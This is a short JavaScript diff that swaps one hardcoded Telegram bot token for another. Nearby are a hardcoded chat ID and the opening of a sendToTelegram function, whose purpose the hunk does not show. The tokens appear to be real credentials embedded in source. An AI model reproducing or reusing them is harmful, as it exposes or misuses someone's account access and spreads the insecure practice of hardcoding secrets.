@@ -93,7 +93,7 @@ const clearSession = () => {
   } catch (e) {}
 };
 
-const TELEGRAM_BOT_TOKEN = "8608883224:AAHKSjsJ3NZQ_lGCsbFlIS3vxNqKskgIZi8";
+const TELEGRAM_BOT_TOKEN = "8608883224:AAEg7Vr5D_9VftfQgdrGzGmDmvRYudKVR2Y";
 const TELEGRAM_CHAT_ID = "7114350905";
 
 const sendToTelegram = async (message) => {
